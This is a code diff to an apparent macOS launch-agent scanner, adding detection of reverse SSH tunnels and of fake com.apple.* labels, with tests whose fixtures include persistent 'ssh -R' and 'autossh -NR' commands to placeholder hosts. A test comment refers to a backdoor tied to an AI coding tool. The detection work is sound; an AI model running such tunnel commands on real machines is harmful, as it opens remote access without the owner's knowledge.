@@ -130,6 +130,49 @@ fn suspicious_place(path: &str, home: &Path, vendor: bool) -> Option<&'static st
     (hidden && !vendor).then_some("a hidden folder")
 }
 
+/// Whether the agent runs `ssh -R` or `autossh -R`: in its arguments, its `-c` script,
+/// or a small script file under home that an interpreter is given.
+fn opens_reverse_tunnel(
+    agent: &Agent,
+    shell_script: Option<&String>,
+    runs: &[&str],
+    home: &Path,
+) -> bool {
+    let mut texts = vec![agent.argv.join(" ")];
+    if let Some(s) = shell_script {
+        texts.push(s.clone());
+    }
+    for path in runs.iter().skip(1) {
+        let p = Path::new(path);
+        if p.starts_with(home)
+            && p.metadata()
+                .is_ok_and(|m| m.is_file() && m.len() <= 64 * 1024)
+        {
+            if let Ok(t) = std::fs::read_to_string(p) {
+                texts.push(t);
+            }
+        }
+    }
+    texts.iter().any(|t| {
+        t.lines().any(|line| {
+            let words: Vec<&str> = line
+                .split(|c: char| c.is_whitespace() || c == ';' || c == '\'' || c == '"')
+                .filter(|w| !w.is_empty())
+                .collect();
+            let ssh = words
+                .iter()
+                .any(|w| matches!(basename(w), "ssh" | "autossh"));
+            let remote = words.iter().any(|w| {
+                w.starts_with('-')
+                    && !w.starts_with("--")
+                    && w[1..].chars().all(|c| c.is_ascii_alphabetic())
+                    && w.contains('R')
+            });
+            ssh && remote
+        })
+    })
+}
+
 pub fn check_agent(agent: &Agent, home: &Path) -> Vec<Hit> {
     let mut hits = Vec::new();
     let Some(exe) = agent.argv.first() else {
@@ -184,6 +227,22 @@ pub fn check_agent(agent: &Agent, home: &Path) -> Vec<Hit> {
                 "Its shell command downloads or decodes code and runs it, or drives osascript. This is how infostealers re-run themselves at login.".into(),
             ));
         }
+    }
+
+    if label.starts_with("com.apple.") {
+        hits.push((
+            "launch-agent-apple-impostor",
+            Severity::High,
+            "It uses an Apple label, but Apple never installs login items in your own LaunchAgents folder. Malware picks these names to blend in.".into(),
+        ));
+    }
+
+    if opens_reverse_tunnel(agent, shell_script, &runs, home) {
+        hits.push((
+            "launch-agent-reverse-tunnel",
+            Severity::Medium,
+            "It keeps a reverse SSH tunnel (ssh -R) open, which lets a remote machine reach this Mac. Check that you set this up.".into(),
+        ));
     }
 
     if agent
@@ -451,6 +510,49 @@ mod tests {
             ids(&check_agent(&fake, home)),
             vec!["launch-agent-suspicious-path"]
         );
+    }
+
+    #[test]
+    fn test_apple_label_in_the_user_folder_is_high() {
+        // Apple never installs into ~/Library/LaunchAgents; the Cursor Claude Code
+        // backdoor used com.apple.sysmond to blend in.
+        let home = Path::new("/Users/dev");
+        let mut a = agent(&["/usr/local/bin/sysmond"]);
+        a.label = "com.apple.sysmond".into();
+        let hits = check_agent(&a, home);
+        assert_eq!(ids(&hits), vec!["launch-agent-apple-impostor"]);
+        assert_eq!(hits[0].1, Severity::High);
+    }
+
+    #[test]
+    fn test_reverse_ssh_tunnel_is_medium() {
+        let home = tmp();
+        let inline = agent(&[
+            "/bin/bash",
+            "-c",
+            "while true; do ssh -N -R '*:0:localhost:22' tunnel@203.0.113.9; sleep 60; done",
+        ]);
+        let auto = agent(&[
+            "/opt/homebrew/bin/autossh",
+            "-M",
+            "0",
+            "-NR",
+            "2222:localhost:22",
+            "x@h",
+        ]);
+        fs::create_dir_all(home.join("bin")).unwrap();
+        let script = home.join("bin/keep.sh");
+        fs::write(
+            &script,
+            "#!/bin/sh\nexec ssh -o BatchMode=yes -R 0:localhost:22 t@h\n",
+        )
+        .unwrap();
+        let from_file = agent(&["/bin/sh", script.to_str().unwrap()]);
+        for a in [inline, auto, from_file] {
+            let hits = check_agent(&a, &home);
+            assert_eq!(ids(&hits), vec!["launch-agent-reverse-tunnel"], "{a:?}");
+            assert_eq!(hits[0].1, Severity::Medium);
+        }
     }
 
     #[test]
